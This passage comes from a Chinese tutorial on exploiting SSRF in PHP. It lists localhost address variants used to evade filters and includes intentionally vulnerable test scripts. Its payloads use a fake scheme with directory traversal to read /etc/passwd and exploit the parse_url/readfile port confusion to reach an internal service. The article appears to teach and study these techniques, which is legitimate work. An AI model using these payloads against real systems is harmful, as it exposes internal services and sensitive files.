!important;word-break: inherit !important;"><span style="line-height: 22px;display: block;word-break: inherit !important;"><code style="white-space: pre-wrap;margin-left: -20px;display: flex;overflow: initial;line-height: 12px;overflow-wrap: normal;border-width: 0px;border-style: initial;border-color: initial;font-size:10px;line-height:30px;;font family: inherit !important;"><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">?&gt;</span></code></span></span></p></li></ol></pre><h3 style="margin-top: 2rem;margin-bottom: 0.5rem;font-weight: 700;color: rgb(248, 95, 72);line-height: 1.35;font-size:20px;line-height:40px;;text-align: start;white-space: normal;font family: Menlo, Monaco, &quot;Source Code Pro&quot;, Consolas, Inconsolata, &quot;Ubuntu Mono&quot;, &quot;DejaVu Sans Mono&quot;, &quot;Courier New&quot;, &quot;Droid Sans Mono&quot;, &quot;Hiragino Sans GB&quot;, 微软雅黑, monospace !important;">其他各种指向127.0.0.1的地址</h3><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="javascript"><code><span class="code-snippet_outer">http:<span class="code-snippet__comment">//localhost/         # localhost就是代指127.0.0.1</span></span></code><code><span class="code-snippet_outer">http:<span class="code-snippet__comment">//0/                 # 0在window下代表0.0.0.0，而在liunx下代表127.0.0.1</span></span></code><code><span class="code-snippet_outer">http:<span class="code-snippet__comment">//0.0.0.0/       # 0.0.0.0这个IP地址表示整个网络，可以代表本机 ipv4 的所有地址</span></span></code><code><span class="code-snippet_outer">http:<span class="code-snippet__comment">//[0:0:0:0:0:ffff:127.0.0.1]/    # 在liunx下可用，window测试了下不行</span></span></code><code><span class="code-snippet_outer">http:<span class="code-snippet__comment">//[::]:80/           # 在liunx下可用，window测试了下不行</span></span></code><code><span class="code-snippet_outer">http:<span class="code-snippet__comment">//127。0。0。1/       # 用中文句号绕过</span></span></code><code><span class="code-snippet_outer">http:<span class="code-snippet__comment">//①②⑦.⓪.⓪.①</span></span></code><code><span class="code-snippet_outer">http:<span class="code-snippet__comment">//127.1/</span></span></code><code><span class="code-snippet_outer">http:<span class="code-snippet__comment">//127.00000.00000.001/ # 0的数量多一点少一点都没影响，最后还是会指向127.0.0.1</span></span></code></pre></section><h3 style="margin-top: 2rem;margin-bottom: 0.5rem;font-weight: 700;color: rgb(248, 95, 72);line-height: 1.35;font-size:20px;line-height:40px;;text-align: start;white-space: normal;font family: Menlo, Monaco, &quot;Source Code Pro&quot;, Consolas, Inconsolata, &quot;Ubuntu Mono&quot;, &quot;DejaVu Sans Mono&quot;, &quot;Courier New&quot;, &quot;Droid Sans Mono&quot;, &quot;Hiragino Sans GB&quot;, 微软雅黑, monospace !important;">利用不存在的协议头绕过指定的协议头</h3><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;"><code style="background: rgb(243, 241, 241);color: rgb(88, 88, 88);font-size:16px;line-height:36px;;line-height: 18px;font family: consolas, menlo, courier, monospace, &quot;Microsoft Yahei&quot; !important;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">file_get_contents</span><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">()</span></code>函数的一个特性，即当PHP的 <code style="background: rgb(243, 241, 241);color: rgb(88, 88, 88);font-size:16px;line-height:36px;;line-height: 18px;font family: consolas, menlo, courier, monospace, &quot;Microsoft Yahei&quot; !important;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">file_get_contents</span><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">()</span></code> 函数在遇到不认识的协议头时候会将这个协议头当做文件夹，造成目录穿越漏洞，这时候只需不断往上跳转目录即可读到根目录的文件。（include()函数也有类似的特性）</p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">测试代码：</p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="php"><code><span class="code-snippet_outer"><span class="code-snippet__comment">// ssrf.php</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__meta">&lt;?php</span></span></code><code><span class="code-snippet_outer">highlight_file(<span class="code-snippet__keyword">__FILE__</span>);</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">if</span>(!preg_match(<span class="code-snippet__string">'/^https/is'</span>,$_GET[<span class="code-snippet__string">'url'</span>])){</span></code><code><span class="code-snippet_outer">    <span class="code-snippet__keyword">die</span>(<span class="code-snippet__string">"no hack"</span>);</span></code><code><span class="code-snippet_outer">}</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">echo</span> file_get_contents($_GET[<span class="code-snippet__string">'url'</span>]);</span></code><code><span class="code-snippet_outer"><span class="code-snippet__meta">?&gt;</span></span></code></pre></section><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">上面的代码限制了url只能是以https开头的路径，那么我们就可以如下：</p><pre style="padding-top: 8px;padding-bottom: 6px;background: rgb(45, 45, 45);border-radius: 0px;overflow-y: auto;color: rgb(80, 97, 109);text-align: start;font-size:10px;line-height:30px;;line-height: 12px;font family: consolas, menlo, courier, monospace, &quot;Microsoft Yahei&quot; !important;border-width: 1px !important;border-style: solid !important;border-color: rgb(226, 226, 226) !important;"><ol class="list-paddingleft-2" style="padding-top: 10px;padding-bottom: 10px;padding-left: 30px;list-style-position: initial;list-style-image: initial;color: transparent;overflow-y: auto;list-style-type: none !important;"><li style="padding-left: 1em;list-style-type: decimal;margin-top: 6px !important;"><p><span style="color: rgb(74, 74, 74);display: block;line-height: 22px;font-size:14px;line-height:34px; !important;word-break: inherit !important;"><span style="line-height: 22px;display: block;word-break: inherit !important;"><code style="white-space: pre-wrap;margin-left: -20px;display: flex;overflow: initial;line-height: 12px;overflow-wrap: normal;border-width: 0px;border-style: initial;border-color: initial;font-size:10px;line-height:30px;;font family: inherit !important;"><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">httpsssss</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">:</span><span style="color: rgb(153, 153, 153);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">//</span></code></span></span></p></li></ol></pre><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">此时 <code style="background: rgb(243, 241, 241);color: rgb(88, 88, 88);font-size:16px;line-height:36px;;line-height: 18px;font family: consolas, menlo, courier, monospace, &quot;Microsoft Yahei&quot; !important;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">file_get_contents</span><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">()</span></code> 函数遇到了不认识的伪协议头“httpsssss://”，就会将他当做文件夹，然后再配合目录穿越即可读取文件：</p><pre style="padding-top: 8px;padding-bottom: 6px;background: rgb(45, 45, 45);border-radius: 0px;overflow-y: auto;color: rgb(80, 97, 109);text-align: start;font-size:10px;line-height:30px;;line-height: 12px;font family: consolas, menlo, courier, monospace, &quot;Microsoft Yahei&quot; !important;border-width: 1px !important;border-style: solid !important;border-color: rgb(226, 226, 226) !important;"><ol class="list-paddingleft-2" style="padding-top: 10px;padding-bottom: 10px;padding-left: 30px;list-style-position: initial;list-style-image: initial;color: transparent;overflow-y: auto;list-style-type: none !important;"><li style="padding-left: 1em;list-style-type: decimal;margin-top: 6px !important;"><p><span style="color: rgb(74, 74, 74);display: block;line-height: 22px;font-size:14px;line-height:34px; !important;word-break: inherit !important;"><span style="line-height: 22px;display: block;word-break: inherit !important;"><code style="white-space: pre-wrap;margin-left: -20px;display: flex;overflow: initial;line-height: 12px;overflow-wrap: normal;border-width: 0px;border-style: initial;border-color: initial;font-size:10px;line-height:30px;;font family: inherit !important;"><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">ssrf</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">.</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">php</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">?</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">url</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">=</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">httpsssss</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">://../../../../../../</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">etc</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">/</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">passwd</span></code></span></span></p></li><li style="padding-left: 1em;background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;list-style-type: decimal;margin-top: 6px !important;"><p><span style="color: rgb(74, 74, 74);display: block;line-height: 22px;font-size:14px;line-height:34px; !important;word-break: inherit !important;"><span style="line-height: 22px;display: block;word-break: inherit !important;"><code style="white-space: pre-wrap;margin-left: -20px;display: flex;overflow: initial;line-height: 12px;overflow-wrap: normal;border-width: 0px;border-style: initial;border-color: initial;font-size:10px;line-height:30px;;font family: inherit !important;"><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">ssrf</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">.</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">php</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">?</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">url</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">=</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">httpsssss</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">://</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">abc</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">../../../../../../</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">etc</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">/</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">passwd</span></code></span></span></p></li></ol></pre><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;"><img data-ratio="0.3361128928800513" src="图片/HACK学习呀_2021-04-01_干货SSRF漏洞利用总结/21_2VwbmBTFm06eAE5d9QFiauc3gydBoA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5g4JljFFDsOMVoHJOhDttoibZWmD2VwbmBTFm06eAE5d9QFiauc3gydBoA/640?wx_fmt=png'" data-type="png" data-w="1559" style="box-sizing: border-box;border-width: 2px;border-style: solid;border-color: rgb(238, 238, 238);border-radius: 6px;"  /></p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">这个方法可以在SSRF的众多协议被禁止且只能使用它规定的某些协议的情况下来进行读取文件。</p><h3 style="margin-top: 2rem;margin-bottom: 0.5rem;font-weight: 700;color: rgb(248, 95, 72);line-height: 1.35;font-size:20px;line-height:40px;;text-align: start;white-space: normal;font family: Menlo, Monaco, &quot;Source Code Pro&quot;, Consolas, Inconsolata, &quot;Ubuntu Mono&quot;, &quot;DejaVu Sans Mono&quot;, &quot;Courier New&quot;, &quot;Droid Sans Mono&quot;, &quot;Hiragino Sans GB&quot;, 微软雅黑, monospace !important;">利用URL的解析问题</h3><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">该思路来自Orange Tsai成员在2017 BlackHat 美国黑客大会上做的题为《A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages》的分享。主要是利用readfile和parseurl函数的解析差异以及curl和parseurl解析差异来进行绕过。</p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;"><strong style="color: rgb(0, 0, 0);">（1）利用readfile和parse_url函数的解析差异绕过指定的端口</strong></p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">测试代码：</p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="php"><code><span class="code-snippet_outer"><span class="code-snippet__comment">// ssrf.php</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__meta">&lt;?php</span></span></code><code><span class="code-snippet_outer">$url = <span class="code-snippet__string">'http://'</span>. $_GET[url];</span></code><code><span class="code-snippet_outer">$parsed = parse_url($url);</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">if</span>( $parsed[port] == <span class="code-snippet__number">80</span> ){  <span class="code-snippet__comment">// 这里限制了我们传过去的url只能是80端口的</span></span></code><code><span class="code-snippet_outer">  readfile($url);</span></code><code><span class="code-snippet_outer">} <span class="code-snippet__keyword">else</span> {</span></code><code><span class="code-snippet_outer">  <span class="code-snippet__keyword">die</span>(<span class="code-snippet__string">'Hacker!'</span>);</span></code><code><span class="code-snippet_outer">}</span></code><code><span class="code-snippet_outer"><span class="code-snippet__meta">?&gt;</span></span></code></pre></section><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">用python在当前目录下起一个端口为11211的WEB服务：</p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;"><img data-ratio="0.22306238185255198" src="图片/HACK学习呀_2021-04-01_干货SSRF漏洞利用总结/22_g56icEtqpfbb8cjXwTw8r0uDVIW59Q.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5gYjPrEtIzSA5XicibZO6Lkvvt9ic7g56icEtqpfbb8cjXwTw8r0uDVIW59Q/640?wx_fmt=png'" data-type="png" data-w="529" style="box-sizing: border-box;border-width: 2px;border-style: solid;border-color: rgb(238, 238, 238);border-radius: 6px;"  /></p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">上述代码限制了我们传过去的url只能是80端口的，但如果我们想去读取11211端口的文件的话，我们可以用以下方法绕过：</p><pre style="padding-top: 8px;padding-bottom: 6px;background: rgb(45, 45, 45);border-radius: 0px;overflow-y: auto;color: rgb(80, 97, 109);text-align: start;font-size:10px;line-height:30px;;line-height: 12px;font family: consolas, menlo, courier, monospace, &quot;Microsoft Yahei&quot; !important;border-width: 1px !important;border-style: solid !important;border-color: rgb(226, 226, 226) !important;"><ol class="list-paddingleft-2" style="padding-top: 10px;padding-bottom: 10px;padding-left: 30px;list-style-position: initial;list-style-image: initial;color: transparent;overflow-y: auto;list-style-type: none !important;"><li style="padding-left: 1em;list-style-type: decimal;margin-top: 6px !important;"><p><span style="color: rgb(74, 74, 74);display: block;line-height: 22px;font-size:14px;line-height:34px; !important;word-break: inherit !important;"><span style="line-height: 22px;display: block;word-break: inherit !important;"><code style="white-space: pre-wrap;margin-left: -20px;display: flex;overflow: initial;line-height: 12px;overflow-wrap: normal;border-width: 0px;border-style: initial;border-color: initial;font-size:10px;line-height:30px;;font family: inherit !important;"><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">ssrf</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">.</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">php</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">?</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">url</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">=</span><span style="color: rgb(249, 145, 87);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">127.0</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">.</span><span style="color: rgb(249, 145, 87);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">0.1</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">:</span><span style="color: rgb(249, 145, 87);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">11211</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">:</span><span style="color: rgb(249, 145, 87);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">80</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">/</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">flag</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">.</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">txt</span></code></span></span></p></li></ol></pre><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;"><img data-ratio="0.23657142857142857" src="图片/HACK学习呀_2021-04-01_干货SSRF漏洞利用总结/23_afDLBb0D2gLllIY76kUJBLsiciawOg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5g9IYHjxL629vxFuVeEJlNesweHWafDLBb0D2gLllIY76kUJBLsiciawOg/640?wx_fmt=png'" data-type="png" data-w="875" style="box-sizing: border-box;border-width: 2px;border-style: solid;border-color: rgb(238, 238, 238);border-radius: 6px;"  /></p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">如上图所示成功读取了11211端口中的flag.txt文件，下面用BlackHat的图来说明原理：</p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;"><img data-ratio="0.5546296296296296" src="图片/HACK学习呀_2021-04-01_干货SSRF漏洞利用总结/24_3nOzwQB2K3oz7PKEnbfh2ick5fBsZQ.jpeg" onerror="this.src='https://mmbiz.qpic.cn/mmbiz/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5gJeVib2VibFkmOia0Qicza5lwU7U0s3nOzwQB2K3oz7PKEnbfh2ick5fBsZQ/640?wx_fmt=jpeg'" data-type="jpeg" data-w="1080"  /></p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">从上图中可以看出readfile()函数获取的端口是最后冒号前面的一部分（11211），而parse_url()函数获取的则是最后冒号后面的的端口（80），利用这种差异的不同，从而绕过WAF。</p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">这两个函数在解析host的时候也有差异，如下图：</p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;"><img data-ratio="0.5" src="图片/HACK学习呀_2021-04-01_干货SSRF漏洞利用总结/25_OB9ow3PMSP4m5tW9sFmXKUyOsamBAQ.jpeg" onerror="this.src='https://mmbiz.qpic.cn/mmbiz/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5gSnxxK8xIMEWVGicZQanjuhxSBOB9ow3PMSP4m5tW9sFmXKUyOsamBAQ/640?wx_fmt=jpeg'" data-type="jpeg" data-w="1080"  /></p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">readfile()函数获取的是@号后面一部分（evil.com），而parseurl()函数获取的则是@号前面的一部分（google.com），利用这种差异的不同，我们可以绕过题目中parseurl()函数对指定host的限制。</p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;"><strong style="color: rgb(0, 0, 0);">（2）利用curl和parse_url的解析差异绕指定的host</strong></p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">原理如下：</p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;"><img data-ratio="0.5712962962962963" src="图片/HACK学习呀_2021-04-01_干货SSRF漏洞利用总结/26_XZsKqtXTUsphwcN8uWAYHfUqFJT5aw.jpeg" onerror="this.src='https://mmbiz.qpic.cn/mmbiz/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5g3bT6azPUDb024vlOvRicfKkWYXZsKqtXTUsphwcN8uWAYHfUqFJT5aw/640?wx_fmt=jpeg'" data-type="jpeg" data-w="1080"  /></p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">从上图中可以看到curl()函数解析的是第一个@后面的网址，而parseurl()函数解析的是第二个@后面的网址。利用这个原理我们可以绕过题目中parseurl()函数对指定host的限制。</p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">测试代码：</p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="xml"><code><span class="code-snippet_outer"><span class="code-snippet__meta">&lt;?php</span></span></code><code><span class="code-snippet_outer">highlight_file(<span class="code-snippet__keyword">__FILE__</span>);</span></code><code><span class="code-snippet_outer"><span class="code-snippet__function"><span class="code-snippet__keyword">function</span> <span class="code-snippet__title">check_inner_ip</span><span class="code-snippet__params">($url)</span></span></span></code><code><span class="code-snippet_outer">{</span></code><code><span class="code-snippet_outer">    $match_result=preg_match(<span class="code-snippet__string">'/^(http|https)?:\/\/.*(\/)?.*$/'</span>,$url);</span></code><code><span class="code-snippet_outer">    <span class="code-snippet__keyword">if</span> (!$match_result)</span></code><code><span class="code-snippet_outer">    {</span></code><code><span class="code-snippet_outer">        <span class="code-snippet__keyword">die</span>(<span class="code-snippet__string">'url fomat error'</span>);</span></code><code><span class="code-snippet_outer">    }</span></code><code><span class="code-snippet_outer">    <span class="code-snippet__keyword">try</span></span></code><code><span class="code-snippet_outer">    {</span></code><code><span class="code-snippet_outer">        $url_parse=parse_url($url);</span></code><code><span class="code-snippet_outer">    }</span></code><code><span class="code-snippet_outer">    <span class="code-snippet__keyword">catch</span>(<span class="code-snippet__keyword">Exception</span> $e)</span></code><code><span class="code-snippet_outer">    {</span></code><code><span class="code-snippet_outer">        <span class="code-snippet__keyword">die</span>(<span class="code-snippet__string">'url fomat error'</span>);</span></code><code><span class="code-snippet_outer">        <span class="code-snippet__keyword">return</span> <span class="code-snippet__keyword">false</span>;</span></code><code><span class="code-snippet_outer">    }</span></code><code><span class="code-snippet_outer">    $hostname=$url_parse[<span class="code-snippet__string">'host'</span>];</span></code><code><span class="code-snippet_outer">    $ip=gethostbyname($hostname);</span></code><code><span class="code-snippet_outer">    $int_ip=ip2long($ip);</span></code><code><span class="code-snippet_outer">    <span class="code-snippet__keyword">return</span> ip2long(<span class="code-snippet__string">'127.0.0.0'</span>)&gt;&gt;<span class="code-snippet__number">24</span> == $int_ip&gt;&gt;<span class="code-snippet__number">24</span> || ip2long(<span class="code-snippet__string">'10.0.0.0'</span>)&gt;&gt;<span class="code-snippet__number">24</span> == $int_ip&gt;&gt;<span class="code-snippet__number">24</span> || ip2long(<span class="code-snippet__string">'172.16.0.0'</span>)&gt;&gt;<span class="code-snippet__number">20</span> == $int_ip&gt;&gt;<span class="code-snippet__number">20</span> || ip2long(<span class="code-snippet__string">'192.168.0.0'</span>)&gt;&gt;<span class="code-snippet__number">16</span> == $int_ip&gt;&gt;<span class="code-snippet__number">16</span>;<span class="code-snippet__comment">// 检查是否是内网ip</span></span></code><code><span class="code-snippet_outer">}</span></code><code><span class="code-snippet_outer"><span class="code-snippet__function"><span class="code-snippet__keyword">function</span> <span class="code-snippet__title">safe_request_url</span><span class="code-snippet__params">($url)</span></span></span></code><code><span class="code-snippet_outer">{</span></code><code><span class="code-snippet_outer">    <span class="code-snippet__keyword">if</span> (check_inner_ip($url))</span></code><code><span class="code-snippet_outer">    {</span></code><code><span class="code-snippet_outer">        <span class="code-snippet__keyword">echo</span> $url.<span class="code-snippet__string">' is inner ip'</span>;</span></code><code><span class="code-snippet_outer">    }</span></code><code><span class="code-snippet_outer">    <span class="code-snippet__keyword">else</span></span></code><code><span class="code-snippet_outer">    {</span></code><code><span class="code-snippet_outer">        $ch = curl_init();</span></code><code><span class="code-snippet_outer">        curl_setopt($ch, CURLOPT_URL, $url);</span></code><code><span class="code-snippet_outer">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="code-snippet__number">1</span>);</span></code><code><span class="code-snippet_outer">        curl_setopt($ch, CURLOPT_HEADER, <span class="code-snippet__number">0</span>);</span></code><code><span class="code-snippet_outer">        $output = curl_exec($ch);</span></code><code><span class="code-snippet_outer">        $result_info = curl_getinfo($ch);</span></code><code><span class="code-snippet_outer">        <span class="code-snippet__keyword">if</span> ($result_info[<span class="code-snippet__string">'redirect_url'</span>])</span></code><code><span class="code-snippet_outer">        {</span></code><code><span class="code-snippet_outer">            safe_request_url($result_info[<span class="code-snippet__string">'redirect_url'</span>]);</span></code><code><span class="code-snippet_outer">        }</span></code><code><span class="code-snippet_outer">        curl_close($ch);</span></code><code><span class="code-snippet_outer">        var_dump($output);</span></code><code><span class="code-snippet_outer">    }</span></code><code><span class="code-snippet_outer">}</span></code><code><span class="code-snippet_outer">$url = $_GET[<span class="code-snippet__string">'url'</span>];</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">if</span>(!<span class="code-snippet__keyword">empty</span>($url)){</span></code><code><span class="code-snippet_outer">    safe_request_url($url);</span></code><code><span class="code-snippet_outer">}</span></code><code><span class="code-snippet_outer"><span 